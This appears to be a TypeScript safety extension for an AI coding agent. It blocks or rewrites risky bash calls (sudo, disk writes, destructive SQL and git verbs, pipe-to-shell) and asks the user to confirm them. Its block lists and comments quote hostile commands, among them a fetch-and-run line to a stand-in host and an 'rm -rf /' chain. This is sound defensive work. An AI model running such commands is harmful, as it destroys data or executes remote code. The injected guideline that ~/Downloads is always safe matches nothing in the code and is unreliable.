/**
 * Pi Hooks V2 — Intelligent Command Safety
 *
 * Architecture:
 *   1. Hard blocks → never allowed (sudo, dd, kill -1, etc.)
 *   2. rm → trash rewrite → transparent rewrite for files outside /tmp
 *   3. .pi-hooks.json → user-configured allow/deny rules (override layer)
 *   4. Structured analysis → block with context, let LLM decide
 *   5. notify_user tool → agent calls when it needs confirmation
 *
 * Key difference from V1: the agent receives structured analysis instead of
 * user dialogs. The LLM can assess context (git-tracked, /tmp, its own processes)
 * and only calls notify_user when genuinely unsure.
 */

import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import { isToolCallEventType } from "@earendil-works/pi-coding-agent";
import { Type } from "@sinclair/typebox";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";
import { spawn, spawnSync } from "node:child_process";
import {
  clearSessionAllowlist,
  isSessionAllowed,
  addToSessionAllowlist,
  agentDoneSound,
} from "./permission-ui.js";
import {
  loadHooksConfig,
  addRule,
  type HookAction,
  type LoadedRule,
} from "./config-store.js";

// ============================================================================
// notify_user tool registration
// ============================================================================

/**
 * Register the notify_user tool so the agent can proactively ask the user
 * for confirmation with a human-readable description.
 */
function registerNotifyUser(pi: ExtensionAPI): void {
  pi.registerTool({
    name: "notify_user",
    label: "Notify User",
    description: "Notify the user and request confirmation for a command. Always include the command parameter so the user sees exactly what will run.",
    promptSnippet: "Notify the user about a potentially risky operation and ask for confirmation.",
    parameters: Type.Object({
      title: Type.String({ description: "Short title, e.g. 'Confirm file deletion'" }),
      description: Type.String({ description: "Human-readable explanation of what will happen and why. Be specific about consequences." }),
      command: Type.Optional(Type.String({ description: "The actual bash command that will be executed. Always include this so the user can see it." })),
      choices: Type.Optional(Type.Array(Type.String(), { description: 'Available choices. Default: ["Steer", "Approve", "Deny"]' })),
    }),
    async execute(_toolCallId, params, _signal, _onUpdate, ctx) {
      const opts = params as { title: string; description: string; command?: string; choices?: string[] };
      const options = opts.choices?.length ? opts.choices : ["Steer", "Approve", "Deny"];

      // Build dialog message: description + command if provided
      let message = opts.description;
      if (opts.command) {
        message += `\n\n\`\`\`bash\n${opts.command}\n\`\`\``;
      }

      // Play attention sound
      try {
        const child = spawn("/usr/bin/afplay", ["/System/Library/Sounds/Sosumi.aiff"], {
          detached: true,
          stdio: "ignore",
        });
        child.unref();
      } catch {}
      process.stdout.write("\x07");

      const choice = await ctx.ui.select(`⚠️ ${opts.title}`, options);

      if (!choice) {
        return {
          content: [{ type: "text" as const, text: "User dismissed the dialog." }],
          details: { choice: "Dismissed" },
        };
      }

      // Approve → add ONLY the exact full command string to the session
      // allowlist. We deliberately do NOT splatter split subcommands here:
      // the previous behaviour combined with regex matching meant that
      // approving e.g. `git status; rm -rf /` would also approve the bare
      // `rm -rf /` fragment for any future call. The allowlist entry has a
      // 60s TTL so a single Approve cannot keep bypassing hard-blocks
      // indefinitely — see permission-ui.ts.
      if ((choice === "Approve") && opts.command) {
        addToSessionAllowlist(opts.command);
      }

      // Tool-result text drives the agent's next action. We make Steer
      // and Deny emphatic so the LLM doesn't blow past them. The
      // canonical contract is also documented in the cascading
      // APPEND_SYSTEM.md (notify_user response handling section).
      let text: string;
      if (choice === "Steer") {
        text =
          `🛑 User chose: **Steer** — STOP all action. Do NOT execute any further tool calls. ` +
          `Reply with ONE short sentence asking the user what to adjust, then await their steering input before proceeding.`;
      } else if (choice === "Deny") {
        text =
          `❌ User chose: **Deny** — abandon this operation entirely. Do NOT retry, do NOT work around it. ` +
          `Acknowledge to the user and stop.`;
      } else if (choice === "Approve") {
        text = `✅ User chose: **Approve** — proceed with the exact approved command without further confirmation.`;
      } else {
        text = `User chose: **${choice}**`;
      }

      return {
        content: [{ type: "text" as const, text }],
        details: { choice },
      };
    },
  });
}

// ============================================================================
// Hard blocks (never allowed, cannot be overridden)
// ============================================================================

// Regex layer — fast path. Each pattern still runs against the literal
// command, but they are now backed up by a tokenised structural analysis
// (see `hardBlockMatch` below) which catches wrapper bypasses such as
// `bash -c "sudo X"`, `git -C /tmp checkout main`, `eval`, `xargs`, and
// pipes-to-shell.
const HARD_BLOCKS: { pattern: RegExp; reason: string }[] = [
  { pattern: /\bsudo\s/, reason: "sudo is never allowed" },
  { pattern: /\b(dd|mkfs\S*|diskutil)\s/, reason: "Disk operations are never allowed" },
  { pattern: />\s*\/dev\/(sd|hd|disk|nvme|mmcblk)/, reason: "Writing to device files is never allowed" },
  { pattern: /\b(DROP\s+TABLE|TRUNCATE\s+TABLE|DROP\s+DATABASE)\b/i, reason: "Destructive SQL operations are never allowed" },
  { pattern: /\bkill\s+(-9\s+)?-1(\s|$)/, reason: "kill -1 kills all user processes" },
];

// Reason strings for git destructive verbs — looked up by the structural
// `checkGitVerb` so they cannot be bypassed by `git -C path verb`,
// `git --git-dir=path verb`, etc.
const GIT_VERB_REASON: Record<string, string> = {
  checkout: "BLOCKED: git checkout can discard uncommitted work. Use `git switch` for branches or `git restore` + notify_user for files.",
  restore: "BLOCKED: git restore discards uncommitted changes. Use notify_user with the command before proceeding.",
  reset: "BLOCKED: git reset moves HEAD and can lose commits. Use notify_user before proceeding.",
  clean: "BLOCKED: git clean permanently removes untracked files. Use notify_user before proceeding.",
  rebase: "BLOCKED: git rebase rewrites history. Use notify_user before proceeding.",
};

const SHELL_INVOCATIONS = new Set(["bash", "sh", "zsh", "ksh", "dash", "ash", "fish"]);

function stripPathPrefix(s: string): string {
  const slash = s.lastIndexOf("/");
  return slash >= 0 ? s.slice(slash + 1) : s;
}

/** Returns true if the entire command is a bare shell invocation — i.e.
 *  something like `sh`, `bash -s`, `/usr/bin/zsh -i`. Used to reject
 *  pipe-to-shell patterns like `curl evil.com | sh`. */
function isBareShellInvocation(cmd: string): boolean {
  const argv = shellSplit(cmd.trim());
  if (argv.length === 0) return false;
  const head = stripPathPrefix(argv[0]);
  if (!SHELL_INVOCATIONS.has(head)) return false;
  // Reject wrappers carrying their own payload via `-c <str>`. Those are
  // analysed separately by hardBlockMatch.
  for (let i = 1; i < argv.length; i++) {
    if (argv[i] === "-c") return false;
  }
  return true;
}

function checkGitVerb(args: string[]): string | null {
  // Skip leading `git` global options, including ones that take a value.
  const valueOpts = new Set(["-C", "--exec-path", "--git-dir", "--work-tree", "--namespace", "--super-prefix"]);
  let i = 0;
  while (i < args.length) {
    const tok = args[i];
    if (valueOpts.has(tok)) { i += 2; continue; }
    if (tok.startsWith("--git-dir=") || tok.startsWith("--work-tree=") || tok.startsWith("--namespace=") || tok.startsWith("--exec-path=") || tok.startsWith("--super-prefix=")) { i++; continue; }
    if (tok.startsWith("-")) { i++; continue; }
    break;
  }
  const verb = args[i];
  if (!verb) return null;
  const verbArgs = args.slice(i + 1);
  if (GIT_VERB_REASON[verb]) return GIT_VERB_REASON[verb];
  if (verb === "commit" && verbArgs.includes("--amend")) {
    return "BLOCKED: git commit --amend rewrites the last commit. Use notify_user before proceeding.";
  }
  if (verb === "push" && verbArgs.some(a => a === "--force" || a === "-f" || a === "--force-with-lease" || a.startsWith("--force-with-lease=") || a === "--delete" || a === "-d")) {
    return "BLOCKED: force-pushing or remote-deleting rewrites remote history. Use notify_user before proceeding.";
  }
  if (verb === "branch" && verbArgs.includes("-D")) {
    return "BLOCKED: git branch -D force-deletes a branch. Use notify_user before proceeding.";
  }
  if (verb === "stash" && (verbArgs.includes("drop") || verbArgs.includes("clear"))) {
    return "BLOCKED: git stash drop/clear permanently removes stashes. Use notify_user before proceeding.";
  }
  if (verb === "tag" && verbArgs.includes("-d")) {
    return "BLOCKED: git tag -d deletes tags. Use notify_user before proceeding.";
  }
  return null;
}

/**
 * Structural hard-block check.
 *
 * Runs the regex layer first as a cheap sieve, then tokenises the command
 * via `shellSplit` and inspects argv[0]:
 *   - `sudo` (or any path ending in /sudo) — blocked outright.
 *   - `git` — hand off to checkGitVerb which skips through `-C` /
 *     `--git-dir=` / `--work-tree=` and friends before reading the verb.
 *   - `bash` / `sh` / `zsh` / ... with `-c <str>` — recurse on the payload.
 *   - `eval` — recurse on the joined remaining args.
 *   - `xargs` — skip xargs flags, recurse on the trailing command.
 *
 * Recursion is bounded to MAX_RECURSE depth.
 */
const MAX_RECURSE = 4;
export function hardBlockMatch(cmd: string, depth = 0): string | null {
  if (depth > MAX_RECURSE) return null;
  const trimmed = cmd.trim();
  if (!trimmed) return null;

  for (const block of HARD_BLOCKS) {
    if (block.pattern.test(trimmed)) return block.reason;
  }

  const argv = shellSplit(trimmed);
  if (argv.length === 0) return null;

  // Skip leading `VAR=value` env assignments
  let idx = 0;
  while (idx < argv.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(argv[idx])) idx++;
  if (idx >= argv.length) return null;

  const argv0 = stripPathPrefix(argv[idx]);
  const rest = argv.slice(idx + 1);

  if (argv0 === "sudo") return "sudo is never allowed";

  if (argv0 === "git") {
    const reason = checkGitVerb(rest);
    if (reason) return reason;
  }

  if (SHELL_INVOCATIONS.has(argv0)) {
    const cIdx = rest.indexOf("-c");
    if (cIdx >= 0 && rest[cIdx + 1] != null) {
      const inner = hardBlockMatch(rest[cIdx + 1], depth + 1);
      if (inner) return inner;
    }
  }

  if (argv0 === "eval") {
    const inner = hardBlockMatch(rest.join(" "), depth + 1);
    if (inner) return inner;
  }

  if (argv0 === "xargs") {
    const xargsValueOpts = new Set(["-I", "-J", "-L", "-n", "-P", "-S", "-d", "-E", "-s"]);
    let i = 0;
    while (i < rest.length) {
      const tok = rest[i];
      if (xargsValueOpts.has(tok)) { i += 2; continue; }
      if (tok.startsWith("-")) { i++; continue; }
      break;
    }
    const innerCmd = rest.slice(i).join(" ");
    if (innerCmd) {
      const inner = hardBlockMatch(innerCmd, depth + 1);
      if (inner) return inner;
    }
  }

  return null;
}

// ============================================================================
// Utility: path resolution
// ============================================================================

function resolveHome(p: string): string {
  const home = os.homedir();
  p = p.replace(/^~\//, home + "/");
  p = p.replace(/^~$/, home);
  p = p.replace(/\$HOME/g, home);
  p = p.replace(/\$\{HOME\}/g, home);
  return p;
}

function safeRealpath(p: string): string {
  try { return fs.realpathSync(p); } catch { return path.resolve(p); }
}

function findProjectRoot(start: string): string {
  let dir = start;
  while (dir !== "/" && dir !== ".") {
    if (fs.existsSync(path.join(dir, ".git"))) return dir;
    dir = path.dirname(dir);
  }
  return start;
}

function isPathSafe(filePath: string, projectRoot: string): boolean {
  const resolved = safeRealpath(resolveHome(filePath));
  const project = safeRealpath(projectRoot);
  const tmpDirs = ["/tmp", "/private/tmp"];
  if (tmpDirs.some((t) => resolved.startsWith(t + "/") || resolved === t)) return true;
  if ((resolved + "/").startsWith(project + "/")) return true;
  return false;
}

// ============================================================================
// Utility: check if paths are in /tmp
// ============================================================================

function isInTmp(filePath: string): boolean {
  const resolved = resolveHome(filePath);
  return resolved.startsWith("/tmp/") || resolved.startsWith("/private/tmp/");
}

// ============================================================================
// Utility: check if file is git-tracked
// ============================================================================

function isGitTracked(filePath: string, projectRoot: string): boolean {
  try {
    // `--` terminates option parsing so a file path beginning with `-`
    // can't be misinterpreted as a flag (argument injection).
    const result = spawnSync("git", ["ls-files", "--error-unmatch", "--", filePath], {
      cwd: projectRoot,
      stdio: ["pipe", "pipe", "pipe"],
      timeout: 3000,
    });
    return result.status === 0;
  } catch {
    return false;
  }
}

// ============================================================================
// Utility: shell argument splitter
// ============================================================================

function shellSplit(cmd: string): string[] {
  const args: string[] = [];
  let current = "";
  let inSingleQuote = false;
  let inDoubleQuote = false;
  let escape = false;

  for (const char of cmd) {
    if (escape) { current += char; escape = false; continue; }
    if (char === "\\" && !inSingleQuote) { escape = true; continue; }
    if (char === "'" && !inDoubleQuote) { inSingleQuote = !inSingleQuote; continue; }
    if (char === '"' && !inSingleQuote) { inDoubleQuote = !inDoubleQuote; continue; }
    if ((char === " " || char === "\t") && !inSingleQuote && !inDoubleQuote) {
      if (current) { args.push(current); current = ""; }
      continue;
    }
    current += char;
  }
  if (current) args.push(current);
  return args;
}

// ============================================================================
// Utility: split chained commands
// ============================================================================

export interface ChainPart {
  cmd: string;
  /** The operator that *precedes* this part in the original chain.
   *  null for the first (leftmost) part. */
  op: "&&" | "||" | ";" | "|" | "&" | null;
}

export interface SplitResult {
  parts: ChainPart[];
  /** True when the input contains constructs we refuse to analyse —
   *  command/process substitutions ($(...), backticks), heredocs, or
   *  unbalanced quoting. Callers should refuse the input rather than
   *  analyse misleading fragments. */
  unparsable: boolean;
}

/**
 * Split a bash command string on chain operators (`&&`, `||`, `;`, `|`, `&`)
 * while respecting single/double quotes.
 *
 * Bails out (returns `unparsable: true`) when the input contains any of:
 *   - command substitution `$(...)`
 *   - backtick substitution `` `...` ``
 *   - heredoc starter `<<` (or `<<-`)
 *   - unbalanced single/double quotes or trailing backslash
 *
 * On bail-out, `parts` is a single element containing the full input so
 * callers can still surface the original command in error messages.
 */
export function splitChainedCommands(command: string): SplitResult {
  // First pass: scan for substitution / heredoc constructs and verify
  // quote balance. We refuse to analyse anything containing dynamic
  // substitution because we cannot reason about the post-expansion text.
  {
    let inSQ = false, inDQ = false, esc = false;
    for (let i = 0; i < command.length; i++) {
      const ch = command[i];
      if (esc) { esc = false; continue; }
      if (!inSQ && ch === "\\") { esc = true; continue; }
      if (!inDQ && ch === "'") { inSQ = !inSQ; continue; }
      if (!inSQ && ch === '"') { inDQ = !inDQ; continue; }
      if (inSQ) continue; // single quotes neutralise everything
      if (ch === "`") {
        return { parts: [{ cmd: command, op: null }], unparsable: true };
      }
      if (ch === "$" && command[i + 1] === "(") {
        return { parts: [{ cmd: command, op: null }], unparsable: true };
      }
      if (ch === "<" && command[i + 1] === "<") {
        return { parts: [{ cmd: command, op: null }], unparsable: true };
      }
    }
    if (inSQ || inDQ || esc) {
      return { parts: [{ cmd: command, op: null }], unparsable: true };
    }
  }

  // Second pass: split on chain operators while respecting quotes.
  const parts: ChainPart[] = [];
  let current = "";
  let pendingOp: ChainPart["op"] = null;
  let inSQ = false, inDQ = false, esc = false;
  let i = 0;
  while (i < command.length) {
    const ch = command[i];
    if (esc) { current += ch; esc = false; i++; continue; }
    if (!inSQ && ch === "\\") { current += ch; esc = true; i++; continue; }
    if (!inDQ && ch === "'") { inSQ = !inSQ; current += ch; i++; continue; }
    if (!inSQ && ch === '"') { inDQ = !inDQ; current += ch; i++; continue; }
    if (inSQ || inDQ) { current += ch; i++; continue; }

    if (ch === "&" && command[i + 1] === "&") {
      parts.push({ cmd: current, op: pendingOp });
      pendingOp = "&&"; current = ""; i += 2; continue;
    }
    if (ch === "|" && command[i + 1] === "|") {
      parts.push({ cmd: current, op: pendingOp });
      pendingOp = "||"; current = ""; i += 2; continue;
    }
    if (ch === ";" || ch === "|" || ch === "&") {
      parts.push({ cmd: current, op: pendingOp });
      pendingOp = ch as ChainPart["op"]; current = ""; i++; continue;
    }
    current += ch; i++;
  }
  parts.push({ cmd: current, op: pendingOp });

  const trimmed = parts
    .map(p => ({ cmd: p.cmd.trim(), op: p.op }))
    .filter(p => p.cmd.length > 0);
  return { parts: trimmed, unparsable: false };
}

/** Re-emit a chain as a single command string, preserving operators. */
export function joinChain(parts: ChainPart[]): string {
  let out = "";
  for (const p of parts) {
    if (p.op) out += " " + p.op + " ";
    out += p.cmd;
  }
  return out;
}

// ============================================================================
// Utility: check if trash is installed
//
// Resolved to an absolute path so subsequent rewrites don't depend on $PATH
// (defends against PATH-shadowing attacks where a malicious `trash` earlier
// in $PATH could be invoked instead).
// ============================================================================

let trashChecked = false;
let trashAbsolutePath: string | null = null;

function resolveTrashBinary(): string | null {
  if (!trashChecked) {
    try {
      const which = spawnSync("which", ["trash"], { timeout: 2000, encoding: "utf-8" });
      if (which.status === 0 && typeof which.stdout === "string") {
        const p = which.stdout.trim();
        if (p) trashAbsolutePath = p;
      }
    } catch {
      // leave trashAbsolutePath = null
    }
    trashChecked = true;
  }
  return trashAbsolutePath;
}

function isTrashInstalled(): boolean {
  return resolveTrashBinary() !== null;
}

/** Test-only reset of memoised state. */
export function _resetTrashCheckCache(): void {
  trashChecked = false;
  trashAbsolutePath = null;
}

// ============================================================================
// Phase 2: rm → trash rewrite
// ============================================================================

/**
 * If command uses `rm` on files outside /tmp, rewrite to use `trash`.
 * Returns the rewritten command, or null if no rewrite needed.
 */
function rewriteRmToTrash(command: string): string | null {
  // Only match top-level rm (not inside bash -c, find -exec, etc.)
  if (!/^\s*rm\s/.test(command)) return null;

  const args = shellSplit(command);
  const targets = args.slice(1).filter((a) => !a.startsWith("-"));

  if (targets.length === 0) return null;

  // If all targets are in /tmp, no rewrite needed
  const allInTmp = targets.every((t) => isInTmp(t));
  if (allInTmp) return null;

  // Check if trash is available
  if (!isTrashInstalled()) return null;

  // Rewrite: rm [flags] path1 path2 ... → <abs trash> [flags] path1 path2 ...
  // Use the absolute path resolved from `which trash` to avoid PATH-shadowing.
  const trashBin = resolveTrashBinary() ?? "trash";
  return trashBin + " " + args.slice(1).join(" ");
}

// ============================================================================
// Phase 4: Structured analysis for blocked commands
// ============================================================================

interface DestructivenessLevel {
  level: "low" | "moderate" | "high" | "critical";
  reversible: boolean;
}

function classifyDestructiveness(cmd: string): DestructivenessLevel {
  // Critical — irreversible system damage
  if (/\bchmod\s+777\b/.test(cmd)) return { level: "critical", reversible: false };
  if (/\bchown\s/.test(cmd)) return { level: "high", reversible: false };
  if (/\b(truncate|shred)\s/.test(cmd)) return { level: "critical", reversible: false };
  if (/\bkillall\s/.test(cmd)) return { level: "critical", reversible: false };
  if (/\b(kill|pkill)\s+(-9|-KILL|-SIGKILL)\s/.test(cmd)) return { level: "high", reversible: false };
  if (/\b(kill|pkill)\s/.test(cmd)) return { level: "moderate", reversible: true };
  if (/\b(pip3?|brew)\s+uninstall\b/.test(cmd)) return { level: "moderate", reversible: true };
  if (/\brm\s/.test(cmd)) return { level: "high", reversible: false };
  if (/\b(mv|cp|ln)\s/.test(cmd)) return { level: "low", reversible: true };
  return { level: "low", reversible: true };
}

interface CommandAnalysis {
  block: true;
  reason: string;
  destructiveness: string;
  category: string;
  summary: string;
  suggestion: string;
  rawCommand: string;
  context: {
    reversible: boolean;
    gitTracked: boolean;
    inTmp: boolean;
    inProject: boolean;
    targets: string[];
  };
}

function buildAnalysis(
  cmd: string,
  projectRoot: string,
  reason: string,
): CommandAnalysis {
  const { level, reversible } = classifyDestructiveness(cmd);
  const args = shellSplit(cmd);
  const targets = args.slice(1).filter((a) => !a.startsWith("-"));

  // Check git-tracked status for file targets
  let gitTracked = false;
  let inProject = false;
  let inTmp = false;

  for (const t of targets) {
    if (isInTmp(t)) { inTmp = true; continue; }
    const expanded = resolveHome(t);
    const resolved = path.isAbsolute(expanded) ? expanded : path.resolve(projectRoot, expanded);
    if ((resolved + "/").startsWith(projectRoot + "/")) {
      inProject = true;
      if (fs.existsSync(resolved) && isGitTracked(resolved, projectRoot)) {
        gitTracked = true;
      }
    }
  }

  // Build summary
  let summary = `Command: ${cmd}`;
  if (targets.length > 0) {
    summary = `Destructive operation on: ${targets.join(", ")}`;
  }

  // Build suggestion
  let suggestion = "";
  if (level === "high" || level === "critical") {
    if (/\brm\s/.test(cmd) && isTrashInstalled()) {
      suggestion = "Use `trash` instead of `rm` for recoverable deletion. If you need permanent deletion, call notify_user with the command and your analysis.";
    } else if (/\bkill\s+-9/.test(cmd)) {
      suggestion = "Consider using `kill` (SIGTERM) instead of `kill -9` (SIGKILL) for graceful shutdown. Call notify_user with the command if unsure.";
    } else {
      suggestion = "This is a destructive operation. Call notify_user with the command to confirm with the user. The user can Approve, Deny, or Steer (redirect you to a safer approach).";
    }
  } else {
    suggestion = "Review the command carefully. Call notify_user with the command if you're unsure. The user can Steer you toward a safer approach.";
  }

  return {
    block: true,
    reason,
    destructiveness: level,
    category: getCommandCategory(cmd),
    summary,
    suggestion,
    rawCommand: cmd,
    context: { reversible, gitTracked, inTmp, inProject, targets },
  };
}

function getCommandCategory(cmd: string): string {
  if (/\b(kill|pkill|killall)\b/.test(cmd)) return "process_management";
  if (/\b(rm|mv|cp|ln|rmdir|unlink)\b/.test(cmd)) return "file_operation";
  if (/\bchmod\s+777\b/.test(cmd)) return "permission_change";
  if (/\bchown\s/.test(cmd)) return "ownership_change";
  if (/\b(truncate|shred)\b/.test(cmd)) return "file_destruction";
  if (/\b(pip3?|brew)\s+uninstall\b/.test(cmd)) return "package_management";
  return "other";
}

// ============================================================================
// Hooks config loading (re-exports from config-store with local wrapper)
// ============================================================================

function findHooksConfig(cwd: string): { rules: LoadedRule[]; filePath: string } | null {
  let dir = cwd;
  while (dir !== "/" && dir !== ".") {
    const config = loadHooksConfig(dir);
    if (config) return config;
    dir = path.dirname(dir);
  }
  return null;
}

function checkPermission(command: string, rules: LoadedRule[]): HookAction | null {
  for (const rule of rules) {
    if (rule.pattern.test(command)) return rule.action;
  }
  return null;
}

// ============================================================================
// Main tool_call handler
// ============================================================================

export default function (pi: ExtensionAPI) {
  // Register notify_user tool
  registerNotifyUser(pi);

  pi.on("tool_call", async (event, ctx) => {
    if (!isToolCallEventType("bash", event)) return undefined;

    const command = event.input.command;
    if (!command) return undefined;

    const projectRoot = findProjectRoot(ctx.cwd);
    const config = findHooksConfig(ctx.cwd);

    // ------------------------------------------------------------------
    // Top-of-handler full-command allowlist check.
    //
    // When the user clicks Approve in notify_user, the EXACT command
    // string (including any `&&`/`;`/`|` chain) is stored verbatim in
    // the session allowlist with a 60s TTL. If the very next bash call
    // matches that string literally, we bypass ALL further analysis —
    // including hard-blocks. The user just saw and approved this exact
    // text; re-blocking it is the bug the user reported.
    //
    // Tight-scoping properties:
    //   - exact literal match (no regex, no fragments)
    //   - 60s TTL (single-shot in practice)
    //   - per-session (cleared on session_start)
    // ------------------------------------------------------------------
    if (isSessionAllowed(command.trim())) {
      return undefined;
    }

    const split = splitChainedCommands(command);

    // Refuse inputs containing dynamic substitution / heredocs / unbalanced
    // quoting outright. We cannot reason about post-expansion text, so it's
    // safer to bounce these to the user via notify_user.
    if (split.unparsable) {
      return {
        block: true,
        reason:
          "HARD BLOCK: command contains dynamic substitution (`$(...)`, backticks, heredoc) or unbalanced quoting that cannot be safely analysed. Restructure without command substitution, or call notify_user to confirm with the user.",
      };
    }

    // Pass 1: per-part allowlist check first, then hard blocks, then rm →
    // trash rewrite. Per-part allowlist also bypasses hard-blocks because
    // the user explicitly approved that exact sub-command via notify_user.
    let needsRewrite = false;
    const rewrittenParts: ChainPart[] = [];

    for (const part of split.parts) {
      const cmd = part.cmd;
      if (!cmd) { rewrittenParts.push(part); continue; }

      // Session allowlist FIRST — an explicit Approve for this exact
      // sub-command bypasses hard-blocks. The TTL (60s) plus exact
      // literal match keeps this tight.
      if (isSessionAllowed(cmd)) {
        rewrittenParts.push(part);
        continue;
      }

      // Hard blocks next.
      const hb = hardBlockMatch(cmd);
      if (hb) return { block: true, reason: `HARD BLOCK: ${hb}` };

      // Pipe-to-shell: `... | bash` / `| sh` etc. The right-hand side of a
      // pipe is a fresh shell invocation — treat it as such.
      if (part.op === "|" && isBareShellInvocation(cmd)) {
        return {
          block: true,
          reason: `HARD BLOCK: piped to shell (\`${cmd}\`) — never allowed. This pattern is the canonical curl-to-shell foot-gun.`,
        };
      }

      // rm → trash rewrite
      const rewritten = rewriteRmToTrash(cmd);
      if (rewritten) {
        needsRewrite = true;
        rewrittenParts.push({ cmd: rewritten, op: part.op });
      } else {
        rewrittenParts.push(part);
      }
    }

    // If any rm was rewritten, re-emit preserving original chain operators
    // (do NOT collapse `&&` to `;` — that loses fail-fast semantics).
    if (needsRewrite) {
      event.input.command = joinChain(rewrittenParts);
    }

    // Pass 2: Re-run allowlist + hard-block check on the (possibly
    // rewritten) parts and then run the destructive-context analysis.
    // We re-run hard blocks here because a rewrite, allowlist hit, or
    // future change could in principle reshape what we're about to
    // dispatch.
    for (const part of rewrittenParts) {
      const trimmed = part.cmd;
      if (!trimmed) continue;

      // Session allowlist first — mirrors Pass 1 ordering.
      if (isSessionAllowed(trimmed)) continue;

      const hb = hardBlockMatch(trimmed);
      if (hb) return { block: true, reason: `HARD BLOCK: ${hb}` };

      // .pi-hooks.json rules → user override
      if (config) {
        const permission = checkPermission(trimmed, config.rules);
        if (permission === "allow") continue;
        if (permission === "deny") {
          return { block: true, reason: `.pi-hooks.json: command denied` };
        }
      }

      // Structured analysis for destructive operations
      const { level } = classifyDestructiveness(trimmed);

      // Low-risk commands pass through
      if (level === "low") continue;

      // Moderate+ → check context, block with analysis
      const isSafeContext = isCommandSafeInContext(trimmed, projectRoot, config);
      if (isSafeContext) continue;

      // Block with analysis for the LLM to review
      const analysis = buildAnalysis(trimmed, projectRoot, `Potentially destructive: ${level} risk`);
      return {
        block: true,
        reason: formatAnalysisForLLM(analysis),
      };
    }

    return undefined;
  });

  // Reset session allowlist on session start
  pi.on("session_start", async (_event, ctx) => {
    clearSessionAllowlist();
    const config = findHooksConfig(ctx.cwd);
    if (config) {
      ctx.ui.notify(
        `Pi hooks active: ${config.rules.length} rule(s)`,
        "info"
      );
    }
  });

  // Agent done sound — REMOVED.
  // Was firing on EVERY LLM turn completion, not just async subagent finishes.
  // The sound is now played directly in oh-pi's notify.ts on subagent:complete,
  // so it only fires when a background task actually finishes.
  // (kept import for agentDoneSound in case other modules need it)

  // Inject safety guidelines into system prompt
  pi.on("before_agent_start", async (event, _ctx) => {
    if (!event.systemPrompt) return;

    const safetyGuidelines = `\n\n## Command Safety Guidelines
- Use \`trash\` instead of \`rm\` for files outside /tmp (automatic rewrite is in place, but prefer trash explicitly)
- **Destructive git commands are HARD BLOCKED**: checkout, reset, clean, rebase, push --force, branch -D, stash drop/clear
- To run a destructive command: call \`notify_user\` with the EXACT command string. If the user clicks Approve, the very next bash call with that exact command bypasses the hard-block for 60 seconds. Do NOT alter the command between Approve and the bash call — even one character of drift breaks the literal match.
- /tmp, /private/tmp, and ~/Downloads are always safe for writes and deletions
- If you're unsure whether a command is safe, use the \`notify_user\` tool to confirm — always pass the \`command\` parameter so the user sees what will run
- Prefer \`kill\` (SIGTERM) over \`kill -9\` (SIGKILL) unless the process is unresponsive

## notify_user response handling
- **Approve**: proceed with the EXACT approved command without further confirmation. Do not modify it.
- **Steer**: STOP. Do not execute any further tool calls. Reply with ONE short sentence asking the user what to adjust, then wait for their input.
- **Deny**: abandon the operation entirely. Do not retry, do not work around it.`;

    event.systemPrompt += safetyGuidelines;
  });
}

// ============================================================================
// Context safety analysis
// ============================================================================

/**
 * Determine if a command is safe to run given its context.
 * Returns true if the command is low-risk in this specific context.
 */
function isCommandSafeInContext(
  cmd: string,
  projectRoot: string,
  config: { rules: LoadedRule[]; filePath: string } | null,
): boolean {
  // kill/pkill targeting common dev processes that the agent likely started
  const killMatch = cmd.match(/\b(kill|pkill)\s+(?:-\w+\s+)?(\d+|\S+)/);
  if (killMatch) {
    const target = killMatch[2];
    // PID numbers — check if it's a recent process (agent's own)
    if (/^\d+$/.test(target)) {
      // Try to check if process belongs to current user and is recent
      try {
        const result = spawnSync("ps", ["-p", target, "-o", "etime="], {
          timeout: 2000,
          encoding: "utf-8",
        });
        if (result.status === 0 && result.stdout.trim()) {
          const elapsed = result.stdout.trim();
          // If process was started recently (< 1 min), likely agent's own
          if (elapsed.match(/^00?:[0-5]?\d$/)) return true;
        }
      } catch {}
    }
  }

  // rm on git-tracked files inside project — recoverable
  if (/\brm\s/.test(cmd)) {
    const args = shellSplit(cmd);
    const targets = args.slice(1).filter((a) => !a.startsWith("-"));
    for (const t of targets) {
      if (isInTmp(t)) continue; // /tmp is always safe
      const expanded = resolveHome(t);
      const resolved = path.isAbsolute(expanded) ? expanded : path.resolve(projectRoot, expanded);
      if ((resolved + "/").startsWith(projectRoot + "/")) {
        if (fs.existsSync(resolved) && isGitTracked(resolved, projectRoot)) {
          continue; // git-tracked, recoverable
        }
        // Non-tracked file in project — check if it looks like a build artifact
        if (isBuildArtifact(resolved)) continue;
        // Otherwise not safe
        return false;
      }
      // Outside project entirely — not safe
      return false;
    }
    return true; // all targets safe
  }

  return false;
}

/**
 * Check if a file looks like a build artifact (safe to delete).
 */
function isBuildArtifact(filePath: string): boolean {
  const safePatterns = [
    /node_modules\//,
    /\.git\//,
    /\.(pyc|pyo|pyd|o|so|a|dylib|class)$/,
    /\/build\//,
    /\/dist\//,
    /\/target\//,
    /\/__pycache__\//,
    /\.DS_Store$/,
    /\.idea\//,
    /\.vscode\//,
  ];
  return safePatterns.some((p) => p.test(filePath));
}

/**
 * Format the analysis as a readable string for the LLM tool result.
 */
function formatAnalysisForLLM(analysis: CommandAnalysis): string {
  const lines: string[] = [];
  lines.push(`⚠️ BLOCKED: ${analysis.summary}`);
  lines.push(`Destructiveness: ${analysis.destructiveness.toUpperCase()}${analysis.context.reversible ? " (reversible)" : " (IRREVERSIBLE)"}`);
  lines.push(`Category: ${analysis.category}`);
  lines.push("");

  if (analysis.context.targets.length > 0) {
    lines.push(`Targets: ${analysis.context.targets.join(", ")}`);
  }

  const contextFlags: string[] = [];
  if (analysis.context.gitTracked) contextFlags.push("git-tracked ✓");
  if (analysis.context.inTmp) contextFlags.push("in /tmp ✓");
  if (analysis.context.inProject) contextFlags.push("in project ✓");
  if (!analysis.context.reversible) contextFlags.push("NOT reversible ✗");
  if (contextFlags.length > 0) {
    lines.push(`Context: ${contextFlags.join(", ")}`);
  }

  lines.push("");
  lines.push(`💡 ${analysis.suggestion}`);
  lines.push(`→ notify_user({ command: "${analysis.rawCommand}", description: "..." })`);

  return lines.join("\n");
}
